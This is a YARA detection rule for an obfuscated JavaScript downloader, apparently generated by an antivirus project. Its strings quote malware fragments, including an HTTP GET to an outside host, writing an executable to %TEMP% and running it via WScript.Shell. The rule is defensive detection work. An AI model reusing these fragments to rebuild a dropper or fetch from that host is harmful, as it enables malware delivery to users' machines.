rule sig_20160328_928693ec1a64a1df8bc124556de16a35 {
  meta:
    description = "datamaliciousorder - file 20160328_928693ec1a64a1df8bc124556de16a35.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "3fb7546b6662ba5de8db6567bdcba8706702b72a7c485314715084d22e03a8ce"

  strings:
    $s1  = "function Qdnvn() {return Udfrugmm[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"V1bsRjngzRaf.exe\";};" fullword ascii
    $s2  = "do {WScript[Unofmexn](Psnzqgf() * 11)} while (Mhnxa[\"readystate\"] < 4 );" fullword ascii
    $s3  = "function Lpaicjit(Wxudsjp, Snzcuiuw){return Wxudsjp - Snzcuiuw;};" fullword ascii
    $s4  = "Mhnxa[Pxxgghu](\"GET\", \"http://chibitesafaris.co.tz/ke7sif\", false);" fullword ascii
    $s5  = "var Udfrugmm = function Dnkniyiv() {return WScript[Tdmpbvju](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Vygdxjv() {return ((Dhaijwwgui == true) && (Dhaijwwgui == Ogjiixfp)) ? 1 : Vgdhbksv;};" fullword ascii
    $s7  = "function Xmpkftj(Lpqxao){Udfrugmm[\"Run\"](Lpqxao, Vgdhbksv, Vgdhbksv);};" fullword ascii
    $s8  = "var Dhaijwwgui = false;" fullword ascii
    $s9  = "function Izdbvlpxtl(Psqjdgnbc) {var Sfriohibcd = (1, 2, 3, 4, 5, Psqjdgnbc); return Sfriohibcd;};" fullword ascii
    $s10 = "var Ogjiixfp = false;" fullword ascii
    $s11 = "var Bigkszgxf = false;" fullword ascii
    $s12 = "function Khawnypwz(){return Xklaqqmpv;};" fullword ascii
    $s13 = " while (Tyzql){" fullword ascii
    $s14 = "Ogjiixfp = true; " fullword ascii
    $s15 = "function Ynyfa(){return Tdmpbvju;};" fullword ascii
    $s16 = "return Lpaicjit(Evmdo, Naqhnrrzqt);" fullword ascii
    $s17 = "var Brhiw = new this[\"Date\"]();" fullword ascii
    $s18 = "function Psnzqgf(){return 22;};" fullword ascii
    $s19 = "function Mnncvj()" fullword ascii
    $s20 = "Dhaijwwgui = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}